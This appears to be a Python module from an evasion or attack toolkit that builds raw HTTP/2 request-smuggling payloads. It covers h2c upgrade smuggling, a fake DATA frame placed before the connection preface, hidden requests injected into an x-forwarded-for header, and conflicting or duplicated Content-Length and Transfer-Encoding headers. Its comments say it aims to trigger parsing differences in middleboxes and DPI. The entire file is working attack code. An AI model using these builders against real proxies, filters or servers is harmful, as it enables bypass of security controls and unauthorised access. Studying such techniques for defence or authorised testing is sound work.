"""
HTTP/2 Smuggling Builders

Frame builders for HTTP/2 request smuggling attacks including
h2c upgrade smuggling, frame confusion, and header injection.
"""

import struct
from typing import List
from core.bypass.attacks.http.http2_utils import HTTP2Frame, HPACKEncoder


def create_h2c_smuggling(payload: bytes, hidden_request: bytes, domain: str) -> bytes:
    """
    Create h2c upgrade smuggling attack.

    Smuggles a hidden HTTP/1.1 request inside the Content-Length body
    of an h2c upgrade request, followed by legitimate HTTP/2 frames.

    Args:
        payload: Actual data payload for HTTP/2 frames
        hidden_request: Hidden HTTP/1.1 request to smuggle
        domain: Target domain

    Returns:
        Complete smuggling attack bytes
    """
    # Create HTTP/1.1 upgrade request with hidden request in body
    upgrade_request = (
        f"POST /api HTTP/1.1\r\n"
        f"Host: {domain}\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
        f"Content-Length: {len(hidden_request)}\r\n"
        f"\r\n"
    ).encode()

    upgrade_request += hidden_request

    # Create HTTP/2 frames to follow the upgrade
    h2_frames = create_post_upgrade_frames(payload, domain)

    return upgrade_request + h2_frames


def create_frame_confusion_smuggling(payload: bytes, hidden_request: bytes) -> bytes:
    """
    Create frame confusion smuggling attack.

    Creates a fake DATA frame before the connection preface to confuse
    frame parsers, potentially smuggling the hidden request.

    Args:
        payload: Actual data payload
        hidden_request: Hidden request to smuggle in fake frame

    Returns:
        Complete smuggling attack bytes with frame confusion
    """
    # Create fake DATA frame with hidden request (before preface!)
    fake_data_frame = HTTP2Frame(0, 0, 1, hidden_request)

    # Create legitimate HEADERS frame
    headers = [
        (b":method", b"POST"),
        (b":path", b"/api"),
        (b":scheme", b"https"),
        (b":authority", b"example.com"),
    ]

    encoder = HPACKEncoder()
    headers_payload = encoder.encode_headers(headers)
    headers_frame = HTTP2Frame(1, 4, 1, headers_payload)  # END_HEADERS flag

    # Create DATA frame with actual payload
    data_frame = HTTP2Frame(0, 1, 1, payload)  # END_STREAM flag

    # Assemble: fake frame first (before preface) + preface + legitimate frames.
    # Note: This intentionally violates "normal" HTTP/2 ordering and is meant to
    # trigger parsing differences in middleboxes/DPIs.
    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    return fake_data_frame.to_bytes() + preface + headers_frame.to_bytes() + data_frame.to_bytes()


def create_header_injection_smuggling(payload: bytes, hidden_request: bytes, domain: str) -> bytes:
    """
    Create header injection smuggling attack.

    Injects the hidden request into a custom header (x-forwarded-for)
    with newlines replaced by semicolons to bypass header parsing.

    Args:
        payload: Actual data payload
        hidden_request: Hidden request to inject in header
        domain: Target domain

    Returns:
        Complete smuggling attack bytes with header injection
    """
    # Inject hidden request into header value (replace newlines with semicolons)
    headers = [
        (b":method", b"POST"),
        (b":path", b"/api"),
        (b":scheme", b"https"),
        (b":authority", domain.encode()),
        (b"x-forwarded-for", hidden_request.replace(b"\r\n", b"; ")),
        (b"content-type", b"application/octet-stream"),
    ]

    encoder = HPACKEncoder()
    headers_payload = encoder.encode_headers(headers)

    # Create HEADERS frame with END_HEADERS flag
    headers_frame = HTTP2Frame(1, 4, 1, headers_payload)

    # Create DATA frame with END_STREAM flag
    data_frame = HTTP2Frame(0, 1, 1, payload)

    # Assemble complete connection
    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    settings_frame = HTTP2Frame(4, 0, 0, b"")

    return preface + settings_frame.to_bytes() + headers_frame.to_bytes() + data_frame.to_bytes()


def create_post_upgrade_frames(payload: bytes, domain: str) -> bytes:
    """
    Create HTTP/2 frames after h2c upgrade.

    Creates SETTINGS, HEADERS, and DATA frames to send after
    a successful h2c upgrade from HTTP/1.1.

    Args:
        payload: Data payload to send
        domain: Target domain

    Returns:
        HTTP/2 frames bytes (without preface)
    """
    # Create SETTINGS frame
    settings_frame = HTTP2Frame(4, 0, 0, b"")

    # Create HEADERS frame
    headers = [
        (b":method", b"POST"),
        (b":path", b"/upload"),
        (b":scheme", b"http"),  # h2c uses http scheme
        (b":authority", domain.encode()),
    ]

    encoder = HPACKEncoder()
    headers_payload = encoder.encode_headers(headers)
    headers_frame = HTTP2Frame(1, 4, 3, headers_payload)  # END_HEADERS flag

    # Create DATA frame
    data_frame = HTTP2Frame(0, 1, 3, payload)  # END_STREAM flag

    return settings_frame.to_bytes() + headers_frame.to_bytes() + data_frame.to_bytes()


def create_smuggled_h2c_request(
    payload: bytes,
    domain: str,
    method: str = "content_length",
    use_chunked: bool = False,
    add_te: bool = True,
) -> bytes:
    """
    Create smuggled h2c request using various smuggling methods.

    Args:
        payload: Data payload to send
        domain: Target domain
        method: Smuggling method ("content_length", "transfer_encoding", "double_content_length")
        use_chunked: Whether to use chunked encoding
        add_te: Whether to add Transfer-Encoding header

    Returns:
        Complete smuggled request bytes
    """
    # Create HTTP/2 frames from payload
    h2_frames = create_h2_frames_from_payload(payload, domain)
    h2_data = b"".join((frame.to_bytes() for frame in h2_frames))

    # Add HTTP/2 preface
    h2_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    full_h2_data = h2_preface + h2_data

    # Choose smuggling method
    if method == "content_length":
        return create_cl_smuggled_request(domain, full_h2_data, use_chunked, add_te)
    elif method == "transfer_encoding":
        return create_te_smuggled_request(domain, full_h2_data, add_te)
    elif method == "double_content_length":
        return create_double_cl_smuggled_request(domain, full_h2_data)
    else:
        return create_simple_h2c_upgrade(domain, full_h2_data)


def create_h2_frames_from_payload(payload: bytes, domain: str) -> List[HTTP2Frame]:
    """
    Create HTTP/2 frames from payload.

    Args:
        payload: Data payload
        domain: Target domain

    Returns:
        List of HTTP/2 frames (SETTINGS, HEADERS, DATA)
    """
    frames = []

    # Create SETTINGS frame
    settings_payload = struct.pack(">HI", 2, 0)  # ENABLE_PUSH = 0
    settings_frame = HTTP2Frame(4, 0, 0, settings_payload)
    frames.append(settings_frame)

    # Create HEADERS frame
    headers = [
        (b":method", b"POST"),
        (b":path", b"/api/bypass"),
        (b":scheme", b"http"),
        (b":authority", domain.encode()),
        (b"content-type", b"application/octet-stream"),
        (b"content-length", str(len(payload)).encode()),
    ]

    hpack_encoder = HPACKEncoder()
    headers_payload = hpack_encoder.encode_headers(headers)
    headers_frame = HTTP2Frame(1, 4, 1, headers_payload)  # END_HEADERS flag
    frames.append(headers_frame)

    # Create DATA frame
    data_frame = HTTP2Frame(0, 1, 1, payload)  # END_STREAM flag
    frames.append(data_frame)

    return frames


def create_cl_smuggled_request(
    domain: str, h2_data: bytes, use_chunked: bool, add_te: bool
) -> bytes:
    """
    Create Content-Length based smuggled request.

    Args:
        domain: Target domain
        h2_data: HTTP/2 data to smuggle
        use_chunked: Whether to use chunked encoding
        add_te: Whether to add conflicting Transfer-Encoding header

    Returns:
        Smuggled request bytes
    """
    first_request = (
        f"POST /api/proxy HTTP/1.1\r\n" f"Host: {domain}\r\n" f"Content-Length: {len(h2_data)}\r\n"
    )

    if add_te:
        first_request += "Transfer-Encoding: chunked\r\n"

    first_request += "Connection: upgrade\r\nUpgrade: h2c\r\n\r\n"

    if use_chunked:
        # Encode as chunked despite Content-Length
        chunk_size = hex(len(h2_data))[2:].upper()
        smuggled_data = f"{chunk_size}\r\n".encode() + h2_data + b"\r\n0\r\n\r\n"
    else:
        smuggled_data = h2_data

    return first_request.encode() + smuggled_data


def create_te_smuggled_request(domain: str, h2_data: bytes, add_te: bool) -> bytes:
    """
    Create Transfer-Encoding based smuggled request.

    Args:
        domain: Target domain
        h2_data: HTTP/2 data to smuggle
        add_te: Whether to add duplicate Transfer-Encoding header

    Returns:
        Smuggled request bytes
    """
    request = (
        f"POST /api/bypass HTTP/1.1\r\n" f"Host: {domain}\r\n" f"Transfer-Encoding: chunked\r\n"
    )

    if add_te:
        # Add conflicting Transfer-Encoding header
        request += "Transfer-Encoding: identity\r\n"

    request += "Connection: upgrade\r\nUpgrade: h2c\r\n\r\n"

    # Encode as chunked
    chunk_size = hex(len(h2_data))[2:].upper()
    chunked_data = f"{chunk_size}\r\n".encode() + h2_data + b"\r\n0\r\n\r\n"

    return request.encode() + chunked_data


def create_double_cl_smuggled_request(domain: str, h2_data: bytes) -> bytes:
    """
    Create double Content-Length smuggled request.

    Sends two conflicting Content-Length headers to confuse proxies.

    Args:
        domain: Target domain
        h2_data: HTTP/2 data to smuggle

    Returns:
        Smuggled request bytes
    """
    fake_length = len(h2_data) // 2
    request = (
        f"POST /api/bypass HTTP/1.1\r\n"
        f"Host: {domain}\r\n"
        f"Content-Length: {fake_length}\r\n"
        f"Content-Length: {len(h2_data)}\r\n"
        f"Connection: upgrade\r\n"
        f"Upgrade: h2c\r\n"
        f"\r\n"
    )

    return request.encode() + h2_data


def create_simple_h2c_upgrade(domain: str, h2_data: bytes) -> bytes:
    """
    Create simple h2c upgrade request.

    Args:
        domain: Target domain
        h2_data: HTTP/2 data to send after upgrade

    Returns:
        Upgrade request followed by HTTP/2 data
    """
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {domain}\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
        f"\r\n"
    )

    return request.encode() + h2_data
